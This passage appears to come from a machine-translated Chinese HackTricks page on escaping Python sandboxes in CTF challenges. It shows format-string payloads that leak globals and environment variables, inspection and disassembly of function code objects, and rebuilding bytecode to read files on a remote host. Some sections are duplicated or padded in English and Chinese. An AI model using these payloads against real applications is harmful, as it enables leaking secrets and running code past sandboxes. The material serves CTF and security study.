print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
您可以在此页面上检查此脚本的输出：

{% content-ref url="broken-reference" %}
[链接已损坏](broken-reference)
{% endcontent-ref %}

![](<../../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Python格式化字符串

如果您向Python发送一个将要进行**格式化**的**字符串**，您可以使用`{}`来访问**Python内部信息**。您可以使用前面的示例来访问全局变量或内置函数。

{% hint style="info" %}
然而，有一个**限制**，您只能使用符号`.[]`，因此您**无法执行任意代码**，只能读取信息。\
_**如果您知道如何通过此漏洞执行代码，请与我联系。**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
请注意，您可以使用**点**（如`people_obj.__init__`）以正常方式访问属性，也可以使用**括号**（不带引号）访问**字典元素**，例如`__globals__[CONFIG]`。

另请注意，您可以使用`.__dict__`来枚举对象的元素，例如`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`。

格式字符串的一些其他有趣特性是通过添加**`!s`**、**`!r`**和**`!a`**来在指定对象中执行**`str`**、**`repr`**和**`ascii`**函数，分别表示字符串、表示和ASCII。
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
此外，还可以在类中**编写新的格式化程序**：
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**更多关于格式化字符串的例子**可以在[https://pyformat.info/](https://pyformat.info)找到。

{% hint style="danger" %}
还可以查看以下页面，其中包含从Python内部对象中读取敏感信息的工具：
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### 敏感信息泄露的有效载荷
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## 解析Python对象

{% hint style="info" %}
如果你想深入了解**Python字节码**，请阅读这篇关于该主题的**精彩**文章：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

在一些CTF中，你可能会得到一个**自定义函数的名称**，其中包含了标志，并且你需要查看函数的**内部**以提取它。

这是要检查的函数：
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

The `dir` function in Python is used to get a list of names in the current local scope or a specific object's attributes. It returns a sorted list of strings containing the names defined by a module, class, instance, or any other object with a `__dir__()` method.

##### Syntax

```python
dir([object])
```

##### Parameters

- `object` (optional): The object whose attributes are to be listed. If not provided, `dir()` returns the names in the current local scope.

##### Return Value

The `dir()` function returns a sorted list of strings containing the names defined by the specified object.

##### Examples

1. Get the names in the current local scope:

```python
print(dir())
```

Output:

```
['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'object']
```

2. Get the attributes of a specific object:

```python
class MyClass:
    def __init__(self):
        self.name = "John"
        self.age = 30

my_object = MyClass()
print(dir(my_object))
```

Output:

```
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']
```

##### Notes

- The `dir()` function can be useful for exploring the attributes of an object and understanding its structure.
- It is important to note that not all objects have a `__dir__()` method. In such cases, `dir()` falls back to a default implementation that returns the attributes of the object's class and its base classes.
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### 全局变量

`__globals__` 和 `func_globals`（相同）获取全局环境。在示例中，您可以看到一些导入的模块，一些全局变量及其声明的内容：
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**在这里查看更多获取全局变量的地方**](./#globals-and-locals)

### **访问函数代码**

**`__code__`** 和 `func_code`: 你可以访问函数的这个属性来获取函数的代码对象。
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### 获取代码信息

To bypass Python sandboxes, it is crucial to gather as much information about the code as possible. This includes understanding the programming language, libraries, and frameworks used, as well as any external dependencies.

为了绕过Python沙箱，收集尽可能多的关于代码的信息至关重要。这包括了解所使用的编程语言、库和框架，以及任何外部依赖项。

#### 1. Inspecting the Code

#### 1. 检查代码

Start by inspecting the code to identify any potential vulnerabilities or weak points. Look for insecure functions, input validation issues, or any other security flaws that could be exploited.

首先检查代码，以确定任何潜在的漏洞或弱点。寻找不安全的函数、输入验证问题或其他可能被利用的安全漏洞。

#### 2. Analyzing Libraries and Frameworks

#### 2. 分析库和框架

Understand the libraries and frameworks used in the code. Research their security history and vulnerabilities. Look for any known exploits or weaknesses that could be leveraged.

了解代码中使用的库和框架。研究它们的安全历史和漏洞。寻找任何已知的可利用的漏洞或弱点。

#### 3. Identifying External Dependencies

#### 3. 识别外部依赖项

Identify any external dependencies that the code relies on. Research their security posture and any potential vulnerabilities. Ensure that these dependencies are up to date and do not have any known security issues.

识别代码所依赖的任何外部依赖项。研究它们的安全状况和任何潜在的漏洞。确保这些依赖项是最新的，并且没有任何已知的安全问题。

### Analyzing the Execution Environment

### 分析执行环境

Understanding the execution environment is crucial for bypassing Python sandboxes. This includes analyzing the operating system, Python version, and any additional security measures in place.

了解执行环境对于绕过Python沙箱至关重要。这包括分析操作系统、Python版本以及任何其他已经实施的安全措施。

#### 1. Operating System Analysis

#### 1. 操作系统分析

Analyze the operating system to identify any specific security features or restrictions that may affect the execution of the code. This could include file system permissions, process isolation, or other security mechanisms.

分析操作系统，以确定可能影响代码执行的特定安全功能或限制。这可能包括文件系统权限、进程隔离或其他安全机制。

#### 2. Python Version Analysis

#### 2. Python版本分析

Understand the Python version being used and research any security vulnerabilities or weaknesses associated with that version. Ensure that the Python interpreter is up to date and does not have any known vulnerabilities.

了解所使用的Python版本，并研究与该版本相关的任何安全漏洞或弱点。确保Python解释器是最新的，并且没有任何已知的漏洞。

#### 3. Additional Security Measures

#### 3. 其他安全措施

Identify any additional security measures in place, such as firewalls, intrusion detection systems, or antivirus software. Understand how these measures may impact the execution of the code and devise strategies to bypass them if necessary.

识别已经实施的任何其他安全措施，例如防火墙、入侵检测系统或防病毒软件。了解这些措施可能如何影响代码的执行，并在必要时制定绕过它们的策略。

### Conclusion

### 结论

Gathering code information and analyzing the execution environment are essential steps in bypassing Python sandboxes. By understanding the code and its dependencies, as well as the execution environment, you can identify potential vulnerabilities and devise strategies to bypass security measures.

收集代码信息和分析执行环境是绕过Python沙箱的关键步骤。通过了解代码及其依赖项以及执行环境，您可以识别潜在的漏洞，并制定绕过安全措施的策略。
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **反汇编函数**

To bypass Python sandboxes, it is often necessary to understand how the sandboxing mechanisms work. One way to do this is by disassembling the target function to analyze its bytecode instructions.

In Python, the `dis` module can be used to disassemble a function. This module provides functions to disassemble Python bytecode into a more human-readable form.

To disassemble a function, you can use the `dis.dis()` function and pass the function object as an argument. This will display the bytecode instructions of the function.

```python
import dis

def target_function():
    # Function code here

dis.dis(target_function)
```

The output will show the bytecode instructions of the function, including the opcode, arguments, and line numbers. By analyzing these instructions, you can gain insights into how the function operates and potentially find vulnerabilities or ways to bypass the sandboxing mechanisms.

Keep in mind that disassembling a function is just one step in the process of bypassing Python sandboxes. It is important to have a good understanding of Python bytecode and the sandboxing mechanisms in order to effectively analyze and exploit the target environment.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
请注意，如果在Python沙箱中无法导入`dis`模块，您可以获取函数的**字节码**（`get_flag.func_code.co_code`），并在本地进行**反汇编**。您将无法看到被加载的变量的内容（`LOAD_CONST`），但可以从`get_flag.func_code.co_consts`中猜测它们，因为`LOAD_CONST`还会告诉您被加载的变量的偏移量。
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## 编译Python

现在，让我们假设你可以以某种方式**转储无法执行但你需要执行的函数的信息**。\
就像下面的例子中，你**可以访问该函数的代码对象**，但仅仅通过阅读反汇编，你**不知道如何计算标志**（_想象一个更复杂的`calc_flag`函数_）
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### 创建代码对象

首先，我们需要知道**如何创建和执行代码对象**，这样我们就可以创建一个来执行我们泄露的函数：
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
根据Python版本，`code_type`的**参数**可能有**不同的顺序**。了解你正在运行的Python版本中参数的顺序的最佳方法是运行以下命令：
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### 重新创建一个泄漏的函数

{% hint style="warning" %}
在下面的示例中，我们将直接从函数代码对象中获取重建函数所需的所有数据。在一个**真实的示例**中，执行函数所需的所有**值**是**你需要泄漏的**。
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### 绕过防御

在本文开头的示例中，您可以看到如何使用`compile`函数执行任何Python代码。这很有趣，因为您可以使用一行代码执行整个脚本（我们也可以使用`exec`来做同样的事情）。\
无论如何，有时候在本地机器上创建一个编译对象并在CTF机器上执行它可能是有用的（例如，因为我们在CTF中没有`compile`函数）。

例如，让我们手动编译并执行一个读取`./poc.py`文件的函数：
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
如果您无法访问`eval`或`exec`，您可以创建一个**适当的函数**，但是直接调用它通常会失败，显示：_在受限模式下无法访问构造函数_。因此，您需要一个**不在受限环境中的函数来调用此函数**。
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## 反编译已编译的Python代码

使用类似[**https://www.decompiler.com/**](https://www.decompiler.com)的工具，可以对给定的已编译Python代码进行反编译。

**查看本教程**：

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## 杂项Python

### 断言

使用参数`-O`执行的Python将删除断言语句和任何基于**debug**值的条件代码。\
因此，像以下这样的检查语句将被删除：
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
将被绕过

## 参考资料

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

![](<../../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具驱动。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
